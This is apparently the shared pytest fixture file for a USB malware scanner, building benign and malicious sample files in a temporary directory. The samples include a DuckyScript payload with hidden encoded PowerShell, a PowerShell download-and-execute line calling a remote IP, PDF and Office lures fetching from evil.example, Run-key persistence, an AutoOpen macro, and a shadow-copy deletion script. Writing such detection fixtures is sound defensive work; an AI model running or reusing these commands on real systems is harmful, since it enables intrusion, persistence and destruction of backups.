"""Shared fixtures for the Ducky Can Shoot test suite.

Everything here is hermetic on purpose:

* the environment is scrubbed of DCS_* variables and XDG directories are
  redirected into a temporary directory, so a developer's own configuration
  can never influence a test;
* the sample medium is built inside tmp_path and never touches the network,
  a real USB stick or anything outside the temporary directory;
* the only ClamAV front ends any test may reach are the fakes in tests/fakes.

Fixture overview
----------------
fake_clamav       puts tests/fakes first on PATH and returns that directory
sample_builder    factory object used to build custom trees and samples
sample_tree       session scoped, USB-like tree with benign and malicious files
clean_tree        small, entirely benign tree
tmp_config        AppConfig with every output/report/outbox path inside tmp_path
qapp              offscreen QApplication (skips cleanly when PyQt6 is missing)
isolated_environment  autouse: scrubs DCS_* and redirects the XDG directories
restore_logging_state autouse: undoes configure_logging so caplog keeps working
"""

from __future__ import annotations

import os
import stat
import struct
import zipfile
from collections.abc import Iterator
from dataclasses import dataclass
from pathlib import Path
from typing import Any

import pytest

TESTS_DIR = Path(__file__).resolve().parent
PROJECT_ROOT = TESTS_DIR.parent
SRC_DIR = PROJECT_ROOT / "src"
FAKES_DIR = TESTS_DIR / "fakes"

#: EICAR test pattern, assembled at run time so this file never trips a scanner
EICAR = (
    b"X5O!P%@AP[4" + bytes([92]) + b"PZX54(P^)7CC)7}$"
    b"EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
)

#: a DuckyScript payload that ends with a dangerous command line
DUCKY_PAYLOAD = "\n".join(
    [
        "REM Duckyscript payload for the test suite",
        "DELAY 1000",
        "GUI r",
        "DELAY 500",
        "STRING powershell -w hidden -nop -enc "
        "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
        "ENTER",
        "DELAY 2000",
        "STRING reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v updater /d %TEMP%\\a.exe",
        "ENTER",
    ]
)


def pe_image(
    *,
    payload: bytes = b"",
    size: int = 8192,
    section: bytes = b".text",
    characteristics: int = 0x0022,
    optional_magic: int = 0x20B,
    fill: bytes | None = None,
    section_offset: int = 0x80,
) -> bytes:
    """Build a minimal but structurally valid PE image.

    The header offsets match what dcs.core.scanner.heuristic reads: the e_lfanew
    pointer at 0x3C, the PE signature, the machine/section/timestamp triple and
    the optional header magic. Extra marker bytes are placed right after the
    signature so packer and API-name checks can see them.
    """
    header = bytearray(0x200)
    header[0:2] = b"MZ"
    struct.pack_into("<I", header, 0x3C, section_offset)
    header[section_offset : section_offset + 4] = b"PE\x00\x00"
    struct.pack_into("<HHI", header, section_offset + 4, 0x8664, 2, 0x5F000000)
    struct.pack_into("<H", header, section_offset + 0x16, characteristics)
    struct.pack_into("<H", header, section_offset + 0x18, optional_magic)
    body = bytes(header) + section + b"\x00" * 8 + payload
    filler = fill if fill is not None else os.urandom(max(0, size - len(body)))
    return body + filler[: max(0, size - len(body))]


def lnk_file(
    target: str,
    *,
    show_command: int = 7,
    extra: bytes = b"",
) -> bytes:
    """Build a .lnk file whose target is stored as UTF-16LE, like Windows does."""
    data = bytearray(0x4C + 0x100 + len(extra))
    data[0:4] = b"\x4c\x00\x00\x00"
    struct.pack_into("<I", data, 0x14, 0x00000001)  # link flags
    struct.pack_into("<I", data, 0x3C, show_command)  # SW_SHOWMINNOACTIVE == 7
    encoded = target.encode("utf-16-le")
    data[0x4C : 0x4C + len(encoded)] = encoded
    return bytes(data) + extra


def ole_macro_document(*, auto_open: bool = True, shell: bool = True) -> bytes:
    """A CFB/OLE document carrying a VBA project, optionally with AutoOpen."""
    macro = 'Attribute VB_Name = "Module1"\r\n'
    if auto_open:
        macro += "Sub AutoOpen()\r\n"
    else:
        macro += "Sub DoWork()\r\n"
    if shell:
        macro += 'CreateObject("WScript.Shell").Run "cmd /c calc"\r\n'
    macro += "End Sub\r\n"
    return (
        bytes.fromhex("d0cf11e0a1b11ae1")
        + b"\x00" * 512
        + b"VBA"
        + macro.encode("latin-1")
        + os.urandom(256)
    )


def zip_bomb_bytes(members: int = 1, size: int = 600 * 1024 * 1024) -> bytes:
    """A deflate archive of zeros: tiny on disk, huge when unpacked."""
    import io

    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
        for index in range(members):
            with archive.open(f"zeros{index}.img", "w") as handle:
                chunk = b"\x00" * (1 << 20)
                remaining = size
                while remaining > 0:
                    handle.write(chunk[: min(len(chunk), remaining)])
                    remaining -= len(chunk)
    return buffer.getvalue()


def encrypted_zip_bytes(name: str, data: bytes) -> bytes:
    """Build a ZIP whose single member is marked with the encrypted bit flag."""
    import io

    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr(name, data)
    blob = bytearray(buffer.getvalue())
    for offset, flag_offset in ((blob.find(b"PK\x03\x04"), 6), (blob.rfind(b"PK\x01\x02"), 8)):
        assert offset >= 0, "the built archive has no header to patch"
        flags = struct.unpack_from("<H", blob, offset + flag_offset)[0]
        struct.pack_into("<H", blob, offset + flag_offset, flags | 0x1)
    return bytes(blob)


def write_bytes(root: Path, name: str, data: bytes | str) -> Path:
    """Write one file under *root*, creating parent directories as needed."""
    path = root / name
    path.parent.mkdir(parents=True, exist_ok=True)
    if isinstance(data, str):
        data = data.encode("utf-8")
    path.write_bytes(data)
    return path


@dataclass
class SampleBuilder:
    """Factory helpers shared by the tests that need their own sample files."""

    def write(self, root: Path, name: str, data: bytes | str) -> Path:
        return write_bytes(root, name, data)

    def eicar(self) -> bytes:
        return EICAR

    def pe(self, **kwargs: Any) -> bytes:
        return pe_image(**kwargs)

    def lnk(self, target: str, **kwargs: Any) -> bytes:
        return lnk_file(target, **kwargs)

    def zip_of(self, members: dict[str, bytes]) -> bytes:
        import io

        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
            for name, payload in members.items():
                archive.writestr(name, payload)
        return buffer.getvalue()

    def password_zip(self, name: str = "secret.txt", payload: bytes = b"payload") -> bytes:
        """Build a ZIP whose member carries the encrypted flag.

        CPython can only read encrypted archives, never write them, so the
        general purpose bit flag 0 is patched into both the local header and
        the central directory.  ZipInfo.flag_bits, which is what a scanner
        looks at, then reports the member as encrypted; the member itself is
        NOT really encrypted, so do not assert decryption behaviour here.
        """
        return encrypted_zip_bytes(name, payload)

    def ooxml(self, *, macro: bool = True, external: bool = False) -> bytes:
        import io

        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, "w") as archive:
            archive.writestr("[Content_Types].xml", "<Types/>")
            archive.writestr("word/document.xml", "<w:document/>")
            if macro:
                archive.writestr("word/vbaProject.bin", b"\xd0\xcf\x11\xe0" + os.urandom(512))
            if external:
                archive.writestr(
                    "word/_rels/settings.xml.rels",
                    '<Relationships><Relationship TargetMode="External" '
                    'Target="http://evil.example/t.dotm"/></Relationships>',
                )
        return buffer.getvalue()

    def tree(self, root: Path, files: dict[str, bytes | str]) -> Path:
        for name, data in files.items():
            self.write(root, name, data)
        return root


@pytest.fixture
def sample_builder() -> SampleBuilder:
    """Factory for custom sample files and trees."""
    return SampleBuilder()


def _build_sample_tree(root: Path) -> Path:
    """Create the USB-like tree used by the scanner, pipeline and CLI tests."""
    builder = SampleBuilder()

    # -- benign content ---------------------------------------------------
    builder.write(root, "readme.txt", "Holiday photos and a few documents.\nNothing to see here.\n")
    builder.write(root, "docs/notes.md", "# Notes\n\nShopping list and travel plans.\n")
    builder.write(
        root,
        "docs/report.pdf",
        b"%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\ntrailer\n%%EOF\n",
    )
    builder.write(root, "music/song.mp3", b"ID3\x03\x00\x00\x00" + os.urandom(2048))
    builder.write(root, "photos/holiday.jpg", b"\xff\xd8\xff\xe0" + os.urandom(4096))

    # -- malware and attack tooling --------------------------------------
    builder.write(root, "eicar.com", EICAR)
    builder.write(root, "payload.txt", DUCKY_PAYLOAD)
    builder.write(
        root,
        "invoice.pdf.exe",
        pe_image(
            section=b"UPX0",
            payload=(
                b"VirtualAllocEx\x00WriteProcessMemory\x00CreateRemoteThread\x00"
                b"GetAsyncKeyState\x00URLDownloadToFile\x00"
            ),
        ),
    )
    builder.write(root, "autorun.inf", "[autorun]\nopen=setup.exe\nicon=setup.exe,0\n")
    builder.write(root, "setup.exe", pe_image(size=4096))
    builder.write(root, "invoice_2026.doc", ole_macro_document())
    builder.write(root, "quote.docm", builder.ooxml())
    builder.write(
        root,
        "ticket.pdf",
        b"%PDF-1.5\n1 0 obj << /Type /Catalog /OpenAction 2 0 R >> endobj\n"
        b"2 0 obj << /S /JavaScript /JS (app.launchURL('http://evil.example/x.exe', true)) >> "
        b"endobj\ntrailer\n%%EOF\n",
    )
    builder.write(
        root,
        "update.ps1",
        "IEX (New-Object Net.WebClient).DownloadString('http://185.11.22.33/a.ps1')\n",
    )
    builder.write(
        root,
        "fix.reg",
        "Windows Registry Editor Version 5.00\n\n"
        "[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\n"
        '"updater"="C:\\Users\\Public\\a.exe"\n',
    )
    builder.write(root, "tools.zip", builder.zip_of({"installer.exe": b"MZ" + os.urandom(1024)}))
    builder.write(root, "photos_backup.zip", zip_bomb_bytes())
    builder.write(
        root,
        "holiday.jpg.lnk",
        lnk_file("C:\\Windows\\System32\\cmd.exe /c powershell -w hidden -enc SQBFAFgA"),
    )
    builder.write(
        root,
        "cleanup.bat",
        "vssadmin delete shadows /all /quiet\nwmic shadowcopy delete\n"
        "bcdedit /set {default} recoveryenabled No\n",
    )
    return root


@pytest.fixture(scope="session")
def sample_tree(tmp_path_factory: pytest.TempPathFactory) -> Path:
    """A USB-like tree with benign files and a broad set of malicious samples."""
    root = tmp_path_factory.mktemp("sample-medium") / "usb"
    root.mkdir(parents=True)
    return _build_sample_tree(root)


@pytest.fixture
def clean_tree(tmp_path: Path) -> Path:
    """A small tree that must never produce a finding."""
    root = tmp_path / "clean-usb"
    root.mkdir()
    write_bytes(root, "readme.txt", "Photos and documents from the trip.\n")
    write_bytes(root, "docs/agenda.md", "# Agenda\n\nNothing malicious at all.\n")
    write_bytes(
        root,
        "docs/report.pdf",
        b"%PDF-1.7\n1 0 obj\n<< /Type /Catalog >>\nendobj\ntrailer\n%%EOF\n",
    )
    write_bytes(root, "music/song.mp3", b"ID3\x03\x00\x00\x00" + os.urandom(1024))
    write_bytes(root, "photos/beach.jpg", b"\xff\xd8\xff\xe0" + os.urandom(2048))
    return root


@pytest.fixture
def tmp_config(tmp_path: Path) -> Any:
    """AppConfig whose every output, report and outbox path lives in tmp_path."""
    from dcs.core.config import AppConfig

    config = AppConfig()
    config.general.output_dir = str(tmp_path / "out")
    config.report.directory = str(tmp_path / "reports")
    config.email.dry_run_dir = str(tmp_path / "outbox")
    config.email.smtp_host = "smtp.example.test"
    config.email.from_addr = "dcs@example.test"
    # email is off in a fresh configuration and the tests that use this fixture
    # are about the stages running, so it is turned on explicitly here
    config.email.enabled = True
    config.email.to_addrs = ["ops@example.test"]
    config.email.attach_report = False
    config.upload.enabled = False
    config.scan.engines = ["heuristic"]
    config.archive.compression_level = 1
    config.source_path = str(tmp_path / "config.toml")
    return config


@pytest.fixture
def fake_clamav(monkeypatch: pytest.MonkeyPatch) -> Path:
    """Put tests/fakes first on PATH so the fake ClamAV front ends are found."""
    for name in ("clamscan", "clamdscan"):
        path = FAKES_DIR / name
        if path.exists():
            path.chmod(path.stat().st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)
    monkeypatch.setenv("PATH", str(FAKES_DIR) + os.pathsep + os.environ.get("PATH", ""))
    monkeypatch.delenv("DCS_FAKE_CLAMD_DOWN", raising=False)
    return FAKES_DIR


@pytest.fixture(autouse=True)
def isolated_environment(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path_factory: pytest.TempPathFactory,
) -> Iterator[None]:
    """Remove DCS_* overrides and keep every XDG path inside a temporary dir."""
    for name in [key for key in os.environ if key.startswith("DCS_")]:
        monkeypatch.delenv(name, raising=False)
    home = tmp_path_factory.mktemp("xdg")
    monkeypatch.setenv("XDG_CONFIG_HOME", str(home / "config"))
    monkeypatch.setenv("XDG_DATA_HOME", str(home / "data"))
    monkeypatch.setenv("XDG_CACHE_HOME", str(home / "cache"))
    # the runtime directory holds the "which DCS is running" marker; keeping it
    # in the temporary tree stops a test from seeing the developer's session
    monkeypatch.setenv("XDG_RUNTIME_DIR", str(home / "run"))
    monkeypatch.setenv("NO_COLOR", "1")
    yield


@pytest.fixture(autouse=True)
def restore_logging_state() -> Iterator[None]:
    """Undo the logging setup a test may have installed.

    dcs.cli.main calls configure_logging, which sets propagate = False on the
    dcs logger; without this the caplog fixture of a later test would silently
    stop seeing any record.  Only the propagation flag and the level are
    restored, so the ring buffer handler stays attached for the GUI tests.
    """
    import logging

    logger = logging.getLogger("dcs")
    propagate, level = logger.propagate, logger.level
    yield
    logger.propagate = propagate
    logger.setLevel(level)


@pytest.fixture(scope="session")
def qapp() -> Iterator[Any]:
    """An offscreen QApplication for the GUI tests.

    The fixture skips (rather than fails) when PyQt6 or the offscreen platform
    plugin is unavailable, which keeps the suite runnable on a headless machine
    without Qt.
    """
    pytest.importorskip("PyQt6.QtWidgets")
    os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")
    if not os.environ.get("QT_QPA_PLATFORM", "").startswith("offscreen"):
        os.environ["QT_QPA_PLATFORM"] = "offscreen"
    from PyQt6.QtWidgets import QApplication

    app = QApplication.instance() or QApplication([])
    yield app
